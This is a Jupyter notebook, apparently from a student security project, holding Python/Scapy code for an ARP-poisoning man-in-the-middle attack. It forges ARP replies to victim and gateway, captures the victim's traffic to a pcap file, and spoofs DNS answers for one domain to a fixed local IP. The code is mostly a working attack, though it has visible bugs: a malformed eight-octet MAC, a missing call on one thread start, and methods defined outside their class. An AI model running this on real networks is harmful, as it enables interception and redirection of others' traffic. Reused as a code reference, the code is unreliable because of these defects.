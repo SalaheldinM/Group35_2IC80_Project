{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4f46e4a7-90bb-4e2e-b472-63f2a7fde8e2",
   "metadata": {
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "noteable": {
     "cell_type": "code"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ccae7a69-3918-4f4f-b7f9-8d381cf0b049",
   "metadata": {
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "noteable": {
     "cell_type": "code"
    }
   },
   "outputs": [],
   "source": [
    "from multiprocessing import Process\n",
    "from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap, DNS, DNSQR, DNSRR, IP, UDP\n",
    "import os\n",
    "import sys\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "66f733ca-ebc8-4396-b933-fb1de6900a8b",
   "metadata": {
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "noteable": {
     "cell_type": "code"
    }
   },
   "outputs": [],
   "source": [
    "def get_macaddress(targetip):\n",
    "    packet = Ether(dst='ff:ff:ff:ff:ff:ff:ff:ff')/ARP(op=\"who-has\", pdst=targetip)\n",
    "    ans, unans = srp(packet, timeout=2, retry=10, verbose=False)\n",
    "    for unans, r in ans:\n",
    "        return r[Ether].src\n",
    "    return None"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8b75ffef-bf5a-42b5-b512-e61cbc3713ea",
   "metadata": {
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "noteable": {
     "cell_type": "code"
    }
   },
   "outputs": [],
   "source": [
    "class Arppoisoner():\n",
    "    def __init__(self, victim, gateway, interface=\"eth0\"):\n",
    "        self.victim = victim\n",
    "        self.victimMac = get_macaddress(victim)\n",
    "        self.gateway = gateway\n",
    "        self.gatewayMac = get_macaddress(gateway)\n",
    "        self.interface = interface\n",
    "        conf.iface = interface\n",
    "        conf.verb = 0\n",
    "\n",
    "        print(f'Initialized {interface}.')\n",
    "        print(f'Gateway({gateway}) is at {self.gatewayMac}.')\n",
    "        print(f'Victim ({victim}) is at {self.victimMac}.')\n",
    "        print('-'*30)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "474420fa-f22b-45e7-a3c1-b78555939242",
   "metadata": {
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "noteable": {
     "cell_type": "code"
    }
   },
   "outputs": [],
   "source": [
    "def run(self):\n",
    "    self.poison_thread = Process(target=self.poison)\n",
    "    self.poison_thread.start\n",
    "\n",
    "    self.sniff_thread = Process(target=self.sniff)\n",
    "    self.sniff_thread.start()\n",
    "\n",
    "    self.dns_spoof_thread = Process(target=self.dns_spoof)\n",
    "    self.dns_spoof_thread.start()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6ae093d5-3edc-47dd-bf12-34a878b1fe26",
   "metadata": {
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "noteable": {
     "cell_type": "code"
    }
   },
   "outputs": [],
   "source": [
    "def poison(self):\n",
    "    poison_victim = ARP()\n",
    "    poison_victim.op = 2\n",
    "    poison_victim.psrc = self.gateway\n",
    "    poison_victim.pdst = self.victim\n",
    "    poison_victim.hwdst = self.victimMac\n",
    "\n",
    "    print(f'ip src: {poison_victim.psrc}')\n",
    "    print(f'ip dst: {poison_victim.pdst}')\n",
    "    print(f'mac dst: {poison_victim.hwdst}')\n",
    "    print(f'mac src: {poison_victim.hwsrc}')\n",
    "    print(poison_victim.summary())\n",
    "    print('-'*30)\n",
    "\n",
    "    poison_gateway = ARP()\n",
    "    poison_gateway.op = 2\n",
    "    poison_gateway.psrc = self.victim\n",
    "    poison_gateway.pdst = self.gateway\n",
    "    poison_gateway.hwdst = self.gatewayMac\n",
    "\n",
    "    print(f'ip src: {poison_gateway.psrc}')\n",
    "    print(f'ip dst: {poison_gateway.pdst}')\n",
    "    print(f'mac dst: {poison_gateway.hwdst}')\n",
    "    print(f'mac src: {poison_gateway.hwsrc}')\n",
    "    print(poison_gateway.summary())\n",
    "    print('-'*30)\n",
    "    print(f'Beginning the ARP Poisoning. [CTRL-C to stop]')\n",
    "\n",
    "    while True:\n",
    "        sys.stdout.write('.')\n",
    "        sys.stdout.flush()\n",
    "        try:\n",
    "            send(poison_victim)\n",
    "            send(poison_gateway)\n",
    "        except KeyboardInterrupt:\n",
    "            self.restore()\n",
    "            sys.exit()\n",
    "        else:\n",
    "            time.sleep(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d13891ba-b550-4c29-bc88-f871799f0586",
   "metadata": {
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "noteable": {
     "cell_type": "code"
    }
   },
   "outputs": [],
   "source": [
    "def sniff(self, count=1000):\n",
    "    time.sleep(5)\n",
    "    print(f'Sniffing {count} packets')\n",
    "    bpf_filter = \"ip host %s\" % self.victim\n",
    "    packets = sniff(count=count, filter=bpf_filter, iface=self.interface)\n",
    "    wrpcap('arper.pcap', packets)\n",
    "    print('Got the packets')\n",
    "    self.restore()\n",
    "    self.poison_thread.terminate()\n",
    "    print('Finished')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2391fc9a-4407-404c-94d4-01a5736a3ec7",
   "metadata": {
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "noteable": {
     "cell_type": "code"
    }
   },
   "outputs": [],
   "source": [
    "def restore(self):\n",
    "    print('Restoring ARP tables...')\n",
    "    send(ARP(\n",
    "        op=2,\n",
    "        psrc=self.gateway,\n",
    "        hwsrc=self.gatewayMac,\n",
    "        pdst=self.victim,\n",
    "        hwdst='ff:ff:ff:ff:ff:ff'), count=5)\n",
    "    send(ARP(\n",
    "        op=2,\n",
    "        psrc=self.victim,\n",
    "        hwsrc=self.victimMac,\n",
    "        pdst=self.gateway,\n",
    "        hwdst='ff:ff:ff:ff:ff:ff'), count=5)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6907d9f2-f96b-4eea-b8cc-2a2ed5e47cad",
   "metadata": {
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "noteable": {
     "cell_type": "code"
    }
   },
   "outputs": [],
   "source": [
    "if __name__ == '__main__':\n",
    "    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])\n",
    "    myarp = Arppoisoner(victim, gateway, interface)\n",
    "    myarp.run()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d3cf284f-65b2-4f2a-8277-b25152e51b93",
   "metadata": {
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "noteable": {
     "cell_type": "code"
    }
   },
   "outputs": [],
   "source": [
    "def dns_spoof(self, pkt):\n",
    "    # Check if the packet is a DNS query\n",
    "    if (pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0):\n",
    "        print('Found DNS request')\n",
    "        original_pkt = pkt\n",
    "        ip = pkt.getlayer(IP)\n",
    "        dns = pkt.getlayer(DNS)\n",
    "        # Check if the DNS query is for a specific domain\n",
    "        if dns.qd.qname == b'specificdomain.com.':\n",
    "            # Craft a DNS response with a specific IP address for the specific domain\n",
    "            spoofed_pkt = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)/DNS(id=dns.id, qr=1, aa=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata='192.168.1.100'))\n",
    "            # Send the spoofed DNS response\n",
    "            send(spoofed_pkt)\n",
    "            print('Sent spoofed response')\n",
    "        else:\n",
    "            # For all other domains, forward the original DNS query\n",
    "            send(original_pkt)\n",
    "            print('Forwarded original DNS query')\n",
    "    return"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  },
  "noteable": {
   "last_delta_id": "8cb3d56e-5da4-4ac9-8102-7635567f9315",
   "last_transaction_id": "8cb3d56e-5da4-4ac9-8102-7635567f9315"
  },
  "noteable-chatgpt": {
   "create_notebook": {
    "openai_conversation_id": "0cb0c5d1-16d7-5cbc-8eed-646eef55b1a5",
    "openai_ephemeral_user_id": "ee5be3c4-f31f-5a0b-ac98-c2c2f6677322",
    "openai_subdivision1_iso_code": "NL-NB"
   }
  },
  "nteract": {
   "version": "noteable@2.9.0"
  },
  "selected_hardware_size": "small"
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
